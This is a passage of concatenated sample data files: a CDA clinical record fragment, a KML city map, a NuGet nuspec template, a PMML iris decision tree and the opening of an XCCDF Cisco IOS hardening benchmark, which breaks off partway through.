							<templateId root="2.16.840.1.113883.10.20.22.4.39"/>
							<!--  ****  Plan of Care Activity Act template   **** -->
							<id root="9a6d1bac-17d3-4195-89a4-1121bc809a5c"/>
							<code code="310634005" codeSystem="2.16.840.1.113883.6.96" displayName="Colonoscopy"/>
							<statusCode code="new"/>
							<effectiveTime>
								<center value="20000421"/>
							</effectiveTime>
						</act>
					</entry>
					<entry>
						<encounter moodCode="INT" classCode="ENC">
							<templateId root="2.16.840.1.113883.10.20.22.4.40"/>
							<!--  ****  Plan of Care Activity Encounter template  **** -->
							<id root="9a6d1bac-17d3-4195-89a4-1121bc809b4d"/>
						</encounter>
					</entry>
					<entry>
						<procedure moodCode="RQO" classCode="PROC">
							<templateId root="2.16.840.1.113883.10.20.22.4.41"/>
							<!-- ** Plan of Care Activity Procedure template ** -->
							<id root="9a6d1bac-17d3-4195-89c4-1121bc809b5a"/>
							<code code="310634005" codeSystem="2.16.840.1.113883.6.96" displayName="Colonoscopy"/>
							<statusCode code="new"/>
							<effectiveTime>
								<center value="20000421"/>
							</effectiveTime>
						</procedure>
					</entry>
				</section>
			</component>
			<!--

********************************************************

SOCIAL HISTORY

********************************************************

-->
			<component>
				<!--   Social History ******** -->
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.17"/>
					<!--  ********  Social history section template   ******** -->
					<code code="29762-2" codeSystem="2.16.840.1.113883.6.1" displayName="Social History"/>
					<title>Social History</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Social History Element</th>
									<th>Description</th>
									<th>Effective Dates</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>
										<content ID="soc1"/> smoking</td>
									<td>1 pack per day</td>
									<td>1947 - 1972</td>
								</tr>
								<tr>
									<td>
										<content ID="soc2"/> smoking</td>
									<td>None</td>
									<td>1973 - </td>
								</tr>
								<tr>
									<td>
										<content ID="soc3"/>Alcohol consumption</td>
									<td>None</td>
									<td>1973 - </td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.38"/>
							<!--  ********  Social history observation template   ******** -->
							<id root="9b56c25d-9104-45ee-9fa4-e0f3afaa01c1"/>
							<code code="230056004" codeSystem="2.16.840.1.113883.6.96" displayName="Cigarette smoking">
								<originalText>
									<reference value="#soc1"/>
								</originalText>
							</code>
							<statusCode code="completed"/>
							<effectiveTime>
								<low value="1947"/>
								<high value="1972"/>
							</effectiveTime>
							<value xsi:type="ST">1 pack per day</value>
						</observation>
					</entry>
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.38"/>
							<!--  ********  Social history observation template   ******** -->
							<id root="45efb604-7049-4a2e-ad33-d38556c9636c"/>
							<code code="230056004" codeSystem="2.16.840.1.113883.6.96" displayName="Cigarette smoking">
								<originalText>
									<reference value="#soc2"/>
								</originalText>
							</code>
							<statusCode code="completed"/>
							<effectiveTime>
								<low value="1973"/>
							</effectiveTime>
							<value xsi:type="ST">None</value>
						</observation>
					</entry>
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.38"/>
							<!--  ********  Social history observation template   ******** -->
							<id root="37f76c51-6411-4e1d-8a37-957fd49d2cef"/>
							<code code="160573003" codeSystem="2.16.840.1.113883.6.96" displayName="Alcohol consumption">
								<originalText>
									<reference value="#soc3"/>
								</originalText>
							</code>
							<statusCode code="completed"/>
							<effectiveTime>
								<low value="1973"/>
							</effectiveTime>
							<value xsi:type="ST">None</value>
						</observation>
					</entry>
				</section>
			</component>
			<!--

********************************************************

VITAL SIGNS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.4.1"/>
					<code code="8716-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="VITAL SIGNS"/>
					<title>Vital Signs</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th align="right">Date / Time: </th>
									<th>Nov 14, 1999</th>
									<th>April 7, 2000</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<th align="left">Height</th>
									<td>
										<content ID="vit1">177 cm</content>
									</td>
									<td>
										<content ID="vit2">177 cm</content>
									</td>
								</tr>
								<tr>
									<th align="left">Weight</th>
									<td>
										<content ID="vit3">86 kg</content>
									</td>
									<td>
										<content ID="vit4">88 kg</content>
									</td>
								</tr>
								<tr>
									<th align="left">Blood Pressure</th>
									<td>
										<content ID="vit5">132/86 mmHg</content>
									</td>
									<td>
										<content ID="vit6">145/88 mmHg</content>
									</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<organizer classCode="CLUSTER" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.26"/>
							<!-- Vital signs organizer template -->
							<id root="c6f88320-67ad-11db-bd13-0800200c9a66"/>
							<code code="46680005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED -CT" displayName="Vital signs"/>
							<statusCode code="completed"/>
							<effectiveTime value="19991114"/>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="8302-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Height"/>
									<text>
										<reference value="#vit1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="19991114"/>
									<value xsi:type="PQ" value="177" unit="cm"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="3141-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Patient Body Weight - Measured"/>
									<text>
										<reference value="#vit4"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="19991114"/>
									<value xsi:type="PQ" value="86" unit="kg"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="8480-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Intravascular Systolic"/>
									<text>
										<reference value="#vit5"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="19991114"/>
									<value xsi:type="PQ" value="132" unit="mm[Hg]"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
						</organizer>
					</entry>
					<entry typeCode="DRIV">
						<organizer classCode="CLUSTER" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.26"/>
							<!-- Vital signs organizer template -->
							<id root="c6f88320-67ad-11db-bd13-0800200c9a66"/>
							<code code="46680005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED -CT" displayName="Vital signs"/>
							<statusCode code="completed"/>
							<effectiveTime value="20000407"/>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="8302-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Height"/>
									<text>
										<reference value="#vit2"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20000407"/>
									<value xsi:type="PQ" value="177" unit="cm"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="3141-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Patient Body Weight - Measured"/>
									<text>
										<reference value="#vit4"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20000407"/>
									<value xsi:type="PQ" value="88" unit="kg"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27"/>
									<!-- Vital Sign Observation template -->
									<id root="c6f88321-67ad-11db-bd13-0800200c9a66"/>
									<code code="8480-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Intravascular Systolic"/>
									<text>
										<reference value="#vit6"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20000407"/>
									<value xsi:type="PQ" value="145" unit="mm[Hg]"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
								</observation>
							</component>
						</organizer>
					</entry>
				</section>
			</component>
			<!--

**Required Sections

Allergies

Medications

Problem List

Procedures

Results



**Optional Sections

Advance Directives

Encounters

Family History

Functional Status

Immunizations

Medical Equipment

Payers

Plan of Care

Social History

Vital Signs

-->
		</structuredBody>
	</component>
</ClinicalDocument>
</file>

<file path="sample_data/test_files/small/kml/mapbox-example.kml">
<?xml version="1.0" encoding="utf-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Portland</name>
      <Point>
        <coordinates>-122.681944,45.52,0</coordinates>
      </Point>
    </Placemark>
    <Placemark>
      <name>Rio de Janeiro</name>
      <Point>
        <coordinates>-43.196389,-22.908333,0</coordinates>
      </Point>
    </Placemark>
    <Placemark>
      <name>Istanbul</name>
      <Point>
        <coordinates>28.976018,41.01224,0</coordinates>
      </Point>
    </Placemark>
    <Placemark>
      <name>Reykjavik</name>
      <Point>
        <coordinates>-21.933333,64.133333,0</coordinates>
      </Point>
    </Placemark>
    <Placemark>
      <name>Simple Polygon</name>
      <Polygon>
        <outerBoundaryIs>
          <LinearRing>
            <coordinates>-122.681944,45.52,0
            -43.196389,-22.908333,0
            28.976018,41.01224,0
            -21.933333,64.133333,0
            -122.681944,45.52,0</coordinates>
          </LinearRing>
        </outerBoundaryIs>
      </Polygon>
    </Placemark>
  </Document>
</kml>
</file>

<file path="sample_data/test_files/small/nuget/example-nuspec.xml">
<?xml version="1.0"?>
<package >
  <metadata>
    
    <id>$id$</id>
    <version>$version$</version>
    <title>$title$</title>
    <authors>$author$</authors>
    <owners>$author$</owners>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
    <description>$description$</description>
    <copyright>$copyright$</copyright>
    <tags>tag1 tag2</tags>
    
    <dependencies>
      <dependency id="Newtonsoft.Json" version="11.0.2" />
      <dependency id="RestSharp" version="106.3.1" />
      <dependency id="Selenium.Support" version="3.14.0" />
      <dependency id="Selenium.WebDriver" version="3.14.0" />
    </dependencies>
    
  </metadata>
</package>
</file>

<file path="sample_data/test_files/small/pmml/ibm-watson-iris-chaid.xml">
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<PMML version="4.2" xmlns="http://www.dmg.org/PMML-4_2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.dmg.org/PMML-4_2 pmml-4-2.xsd">
  <Header copyright="Copyright(c) IBM Corp. 1989-2015. All rights reserved.">
    <Application name="IBM SPSS Modeler Common" version="18.0.0.0"/>
    <Timestamp/>
</Header>
  <DataDictionary numberOfFields="5">
    <DataField dataType="double" displayName="Sepal.Length" isCyclic="0" name="Sepal.Length" optype="continuous"/>
    <DataField dataType="double" displayName="Sepal.Width" isCyclic="0" name="Sepal.Width" optype="continuous"/>
    <DataField dataType="double" displayName="Petal.Length" isCyclic="0" name="Petal.Length" optype="continuous"/>
    <DataField dataType="double" displayName="Petal.Width" isCyclic="0" name="Petal.Width" optype="continuous"/>
    <DataField dataType="string" displayName="Species" isCyclic="0" name="Species" optype="categorical">
      <Value displayValue="setosa" property="valid" value="setosa"/>
      <Value displayValue="versicolor" property="valid" value="versicolor"/>
      <Value displayValue="virginica" property="valid" value="virginica"/>
</DataField>
</DataDictionary>
  <TreeModel algorithmName="CHAID" functionName="classification">
    <Extension extender="spss.com">
      <X-risk value="0.0266666666666667"/>
      <X-seOfRisk value="0.01315435429951"/>
</Extension>
    <MiningSchema>
      <MiningField importance="0.792654" name="Petal.Width" usageType="active"/>
      <MiningField importance="0.128223" name="Sepal.Width" usageType="active"/>
      <MiningField importance="0.0791228" name="Petal.Length" usageType="active"/>
      <MiningField name="Species" usageType="predicted"/>
</MiningSchema>
    <ModelStats>
      <UnivariateStats field="Petal.Width">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
      <UnivariateStats field="Sepal.Width">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
      <UnivariateStats field="Petal.Length">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
</ModelStats>
    <Node defaultChild="1" id="0" recordCount="150" score="setosa">
      <Extension>
        <X-Node>
          <X-NodeStats adjPValue="4.75967387732713e-051" chiSquare="258.699665551839" df1="6"/>
</X-Node>
</Extension>
      <True/>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="setosa">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="versicolor">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="virginica">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <Node id="1" recordCount="48" score="setosa">
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <True/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="0.4"/>
</CompoundPredicate>
          <True/>
</CompoundPredicate>
        <ScoreDistribution confidence="1" probability="1" recordCount="48" value="setosa">
          <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
      <Node defaultChild="5" id="2" recordCount="30" score="versicolor">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="2.5922778346965e-007" chiSquare="30" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="0.4"/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="1.3"/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0.0666666666666667" probability="0.0666666666666667" recordCount="2" value="setosa">
          <Extension extender="spss.com" name="probability" value="0.0666666666666667"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.933333333333333" probability="0.933333333333333" recordCount="28" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.933333333333333"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <Node id="5" recordCount="28" score="versicolor">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Sepal.Width" operator="lessOrEqual" value="3"/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="1" probability="1" recordCount="28" value="versicolor">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
        <Node id="6" recordCount="2" score="setosa">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Sepal.Width" operator="greaterThan" value="3"/>
              <True/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="1" probability="1" recordCount="2" value="setosa">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
</Node>
      <Node defaultChild="7" id="3" recordCount="26" score="versicolor">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="0.00465122067170656" chiSquare="11.2996825396825" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="1.3"/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="1.7"/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.807692307692308" probability="0.807692307692308" recordCount="21" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.807692307692308"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.192307692307692" probability="0.192307692307692" recordCount="5" value="virginica">
          <Extension extender="spss.com" name="probability" value="0.192307692307692"/>
</ScoreDistribution>
        <Node id="7" recordCount="20" score="versicolor">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Petal.Length" operator="lessOrEqual" value="4.9"/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.95" probability="0.95" recordCount="19" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.95"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.05" probability="0.05" recordCount="1" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.05"/>
</ScoreDistribution>
</Node>
        <Node id="8" recordCount="6" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Petal.Length" operator="greaterThan" value="4.9"/>
              <True/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="2" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.666666666666667" probability="0.666666666666667" recordCount="4" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.666666666666667"/>
</ScoreDistribution>
</Node>
</Node>
      <Node defaultChild="10" id="4" recordCount="46" score="virginica">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="0.0271214034627571" chiSquare="6.81481481481481" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="1.7"/>
            <True/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.0217391304347826" probability="0.0217391304347826" recordCount="1" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.0217391304347826"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.978260869565217" probability="0.978260869565217" recordCount="45" value="virginica">
          <Extension extender="spss.com" name="probability" value="0.978260869565217"/>
</ScoreDistribution>
        <Node id="9" recordCount="6" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Petal.Length" operator="lessOrEqual" value="4.9"/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.166666666666667" probability="0.166666666666667" recordCount="1" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.166666666666667"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.833333333333333" probability="0.833333333333333" recordCount="5" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.833333333333333"/>
</ScoreDistribution>
</Node>
        <Node id="10" recordCount="40" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Petal.Length" operator="greaterThan" value="4.9"/>
              <True/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="1" probability="1" recordCount="40" value="virginica">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
</Node>
</Node>
</Node>
    <Extension>
      <X-TreeModel>
        <X-Priors>
          <X-Prior-Value targetCategory="setosa" value="0.333333333333333"/>
          <X-Prior-Value targetCategory="versicolor" value="0.333333333333333"/>
          <X-Prior-Value targetCategory="virginica" value="0.333333333333333"/>
</X-Priors>
</X-TreeModel>
</Extension>
</TreeModel>
</PMML>
</file>

<file path="sample_data/test_files/small/scap/ios-sample-1.0.xccdf.xml">
<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is an example only. -->

<cdf:Benchmark id="ios-test-6" resolved="0" xml:lang="en"
   xmlns:cdf="http://checklists.nist.gov/xccdf/1.0"
   xmlns:cdfp="http://www.cisecurity.org/xccdf/platform/0.2.3"
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:htm="http://www.w3.org/1999/xhtml"
   xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
   xsi:schemaLocation="http://checklists.nist.gov/xccdf/1.0 xccdf.xsd http://www.cisecurity.org/xccdf/platform/0.2.3 platform-0.2.3.xsd">

   <cdf:status date="2004-09-24">draft</cdf:status>
   <cdf:title>XCCDF Sample for Cisco IOS</cdf:title>
   <cdf:description>
     This document defines a small set of rules for securing Cisco 
     IOS routers.  The set of rules constitute a <htm:i>benchmark</htm:i>. 
     A benchmark usually represents an industry consensus of best 
     practices.  It lists steps to be taken as well as rationale for 
     them.  This example benchmark is merely a small subset of the
     rules that would be necessary for securing an IOS router.
   </cdf:description>

   <cdf:notice id="Sample-Terms-Of-Use" xml:lang="en">
     This sample may be freely copied and used, at least for now.
   </cdf:notice>
   <cdf:front-matter>
     <htm:p>
       This benchmark assumes that you are running IOS 11.3 or later.
     </htm:p>
   </cdf:front-matter>
   <cdf:reference href="http://www.nsa.gov/ia/">
     NSA Router Security Configuration Guide, Version 1.1b
   </cdf:reference>
   <cdf:reference>
      <dc:title>Hardening Cisco Routers</dc:title>
      <dc:creator>Thomas Akin</dc:creator>
      <dc:publisher>O'Reilly and Associates</dc:publisher>
      <dc:identifier>http://www.ora.com/</dc:identifier>
   </cdf:reference>

   <cdfp:platform-definitions>
      <cdfp:os id="os-cisco-ios12">
        <cdfp:title>Cisco IOS 12.x</cdfp:title>
        <cdfp:remark xml:lang="en">All IOS up through 12.3</cdfp:remark>
        <cdfp:vendor>Cisco Systems</cdfp:vendor>
        <cdfp:family>IOS</cdfp:family>
        <cdfp:level>12</cdfp:level>
        <cdfp:version-range>
           <cdfp:min-inclusive>12.3.1</cdfp:min-inclusive>
           <cdfp:max-inclusive>12.3.8</cdfp:max-inclusive>
        </cdfp:version-range>
      </cdfp:os>
      <cdfp:hardware id="hwr-routers">
         <cdfp:title>Cisco routers</cdfp:title>
         <cdfp:vendor>Cisco Systems</cdfp:vendor>
         <cdfp:family>router</cdfp:family>
      </cdfp:hardware>
      <cdfp:platform-definition id="cisco-ios-12-routers">
        <cdfp:title>Cisco IOS version 12 for Routers</cdfp:title>
        <cdfp:logical-operator operator="and">
          <cdfp:product idref="os-cisco-ios12"/>
          <cdfp:product idref="hwr-routers"/>
        </cdfp:logical-operator>
      </cdfp:platform-definition>
   </cdfp:platform-definitions>

   <cdf:platform idref="cisco-ios-12-routers"/>
   <cdf:version>0.1.12</cdf:version>

 <cdf:Value id="exec-timeout-time" type="number" 
             operator="less than or equal">
    <cdf:title>IOS - line exec timeout value</cdf:title>
    <cdf:description>
       The length of time, in minutes, that an interactive session
       should be allowed to stay idle before being terminated.  
    </cdf:description>
    <cdf:question>Session exec timeout time (in minutes)</cdf:question>
    <cdf:value>10</cdf:value>
    <cdf:default>15</cdf:default>
    <cdf:lower-bound>1</cdf:lower-bound>
    <cdf:upper-bound>60</cdf:upper-bound>
 </cdf:Value>

 <cdf:Group id="mgmt-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Management Plane Rules</cdf:title>
     <cdf:description>
       Services, settings, and data streams related tosetting up 
       and examining the static configuration of the router, and the
       authentication and authorization of administrators/operators.
     </cdf:description>
     <cdf:requires idref="no-directed-broadcast"/>
     <cdf:Rule id="no-finger-service-base" selected="0" weight="5.0"
               prohibitChanges="1" hidden="1" abstract="1" cluster-id="finger">
       <cdf:title>IOS - no IP finger service</cdf:title>
       <cdf:description>
         Disable the finger service, it can reveal information
         about logged in users to unauthorized parties.
       </cdf:description>
       <cdf:question>Prohibit the finger service</cdf:question>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL1002"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="ios11-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title>IOS 11 - no IP finger service</cdf:title>
       <cdf:fix>no service finger</cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="ios12-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title>IOS 12 - no IP finger service</cdf:title>
       <cdf:fix>no ip finger</cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="req-exec-timeout" selected="1" weight="8.3">
       <cdf:title>Require exec timeout on admin sessions</cdf:title>
       <cdf:description>
         Configure each administrative access line to terminate idle
         sessions after a fixed period of time determined by local policy
       </cdf:description>
       <cdf:question>Require admin session idle timeout</cdf:question>
       <cdf:fix>
           line vty 0 4
           exec-timeout <cdf:sub idref="exec-timeout-time"/>
       </cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-export value-id="exec-timeout-time" 
                           export-name="var-2"/>
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL708"/>
       </cdf:check>
     </cdf:Rule>
 </cdf:Group>

 <cdf:Group id="ctrl-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Control Plane Rules</cdf:title>
     <cdf:description>
          Services, settings, and data streams that support the 
          operation and dynamic status of the router.
     </cdf:description>
     <cdf:question>Check rules related to system control</cdf:question>

     <cdf:Value id="buffered-logging-level" type="string"
                operator="equals" prohibitChanges="0">
       <cdf:title>Logging level for buffered logging</cdf:title>
       <cdf:description>
          Logging level for buffered logging; this setting is
          a severity level.  Every audit message of this
          severity or more (worse) will be logged.
       </cdf:description>
       <cdf:question>Select a buffered logging level</cdf:question>
       <cdf:value selector="strict">informational</cdf:value>
       <cdf:value selector="lenient">warning</cdf:value>
       <cdf:value>notification</cdf:value>
       <cdf:choices mustMatch="1">
          <cdf:choice>warning</cdf:choice>
          <cdf:choice>notification</cdf:choice>
          <cdf:choice>informational</cdf:choice>
       </cdf:choices>
     </cdf:Value>

     <cdf:Rule id="no-tcp-small-servers" selected="1" 
               prohibitChanges="1" weight="7">
       <cdf:title>Disable tcp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Prohibit TCP small services</cdf:question>
       <cdf:fixtext>
           Disable TCP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service tcp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1000"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="no-udp-small-servers" selected="1" 
               prohibitChanges="1" weight="5.7">
       <cdf:title>Disable udp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary UDP services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Forbid UDP small services</cdf:question>
       <cdf:fixtext>
